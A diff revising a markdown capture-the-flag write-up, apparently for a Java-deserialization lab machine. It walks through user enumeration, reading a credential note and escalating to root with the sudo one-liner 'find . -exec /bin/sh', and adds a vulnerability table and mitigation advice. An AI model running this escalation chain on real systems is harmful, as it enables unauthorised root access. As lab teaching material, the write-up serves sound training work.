@@ -86,33 +86,40 @@ id
 
 ---
 
-## Privilege Escalation
+## Enumeration & Credential Discovery
 
-### Step 1: Enumerate System Users
+### Discover System Users
 
 ```bash
 ls /home
 # Output: cmnatic, jboss, tony
 ```
 
-### Step 2: Discover Credentials
+### Found Credentials
 
-Found a note in JBoss home directory:
+Located a note in the JBoss home directory containing important information:
 ```bash
 cat /home/jboss/note
 ```
 
-Contains a hint about a password reset (redacted for security).
+This note contains hints about password resets and potential credential paths.
 
-### Step 3: Privilege Escalation to JBoss User
+### First User Flag
 
-Using discovered credentials, switched to the `jboss` user:
+Located in `/home/jboss/.jboss.txt` (hidden file)
+
+---
+
+## Privilege Escalation
+
+### Phase 1: Escalate to JBoss User
+
+Using credentials discovered in the note, switched to the `jboss` user:
 ```bash
 su jboss
-# Successfully switched user
 ```
 
-### Step 4: Check Sudo Privileges
+### Phase 2: Check Sudo Privileges
 
 ```bash
 sudo -l
@@ -124,11 +131,11 @@ User jboss may run the following commands on thm-java-deserial:
     (ALL) NOPASSWD: /usr/bin/find
 ```
 
-The `jboss` user can run `/usr/bin/find` with NOPASSWD sudo.
+**Critical Finding:** The `jboss` user can run `/usr/bin/find` with NOPASSWD sudo privileges.
 
-### Step 5: Root Escalation via Find
+### Phase 3: Root Escalation via Find
 
-Using the `-exec` flag in `find` to execute arbitrary commands as root:
+Exploited the misconfigured sudo privilege using the `-exec` flag in `find`:
 
 ```bash
 sudo find . -exec /bin/sh \; -quit
@@ -141,43 +148,62 @@ id
 # uid=0(root) gid=0(root) groups=0(root)
 ```
 
----
+### Phase 4: Retrieve Root Flag
 
-## Flag Locations
-
-**User Flag:** Located in `/home/jboss/.jboss.txt` (discovered during initial reconnaissance)
-
-**Root Flag:** Located in `/root/root.txt` (base64 encoded)
+Located in `/root/root.txt` (base64 encoded)
 
 ---
 
 ## Key Vulnerabilities Exploited
 
-1. **Java Deserialization (RCE)** - Unpatched JBoss AS with vulnerable RMI endpoints
-2. **Weak Authentication** - Default/weak credentials in admin-console
-3. **Privilege Escalation via Sudo** - `jboss` user can run `find` with NOPASSWD
-4. **Unsafe Find Exec** - `-exec` flag can execute arbitrary commands
+| Vulnerability | Severity | Impact |
+|---|---|---|
+| Java Deserialization (RCE) | Critical | Unpatched JBoss AS with vulnerable RMI endpoints |
+| Default/Weak Credentials | High | Accessible admin-console with default authentication |
+| Weak Sudo Configuration | Critical | `jboss` user can run `find` with NOPASSWD |
+| Unsafe Find Usage | Critical | `-exec` flag can execute arbitrary commands as root |
+
+---
+
+## Attack Chain Summary
+
+```
+Initial Access (JexBoss RCE)
+        ↓
+cmnatic User (1000:1000)
+        ↓
+Discover Credentials in /home/jboss/note
+        ↓
+Switch to jboss User
+        ↓
+Identify NOPASSWD sudo on /usr/bin/find
+        ↓
+Exploit find -exec to spawn root shell
+        ↓
+Root Access (0:0)
+```
 
 ---
 
 ## Mitigation Recommendations
 
-1. **Update JBoss** - Patch to the latest version with security fixes
-2. **Disable Remote Services** - Restrict RMI and admin-console access to trusted networks
-3. **Remove Default Credentials** - Change all default admin passwords
-4. **Restrict Sudo Privileges** - Avoid granting NOPASSWD to powerful commands like `find`
+1. **Update JBoss** - Patch to the latest version with Java deserialization security fixes
+2. **Disable Remote Services** - Restrict RMI and admin-console access to trusted networks only
+3. **Enforce Strong Authentication** - Remove all default credentials and enforce strong password policies
+4. **Restrict Sudo Privileges** - Avoid granting NOPASSWD to powerful commands like `find`, `find -exec`, or shell access
 5. **Implement Network Segmentation** - Isolate internal services from direct internet access
-6. **Enable Monitoring** - Log all sudo executions and RMI activity
+6. **Enable Monitoring & Logging** - Log all sudo executions, RMI activity, and authentication attempts
+7. **File Permissions** - Secure sensitive configuration files and credential storage
 
 ---
 
 ## Tools Used
 
-- **nmap** - Service discovery and enumeration
-- **gobuster** - Web directory enumeration
-- **JexBoss** - Java vulnerability scanner and exploitation
+- **nmap** - Service discovery and version enumeration
+- **gobuster** - Web directory and endpoint discovery
+- **JexBoss** - Java vulnerability scanner and automated exploitation
 - **netcat** - Reverse shell listener
-- **find** - Linux command for privilege escalation
+- **find** - Linux command for privilege escalation exploitation
 
 ---
 
@@ -185,4 +211,5 @@ id
 
 - JexBoss GitHub: https://github.com/joaomatosf/jexboss
 - CWE-502: Deserialization of Untrusted Data
-- CVE-2017-5645: JBoss vulnerability
+- CVE-2017-5645: JBoss RMI Registry Vulnerability
+- GTFOBins - find: https://gtfobins.github.io/gtfobins/find/
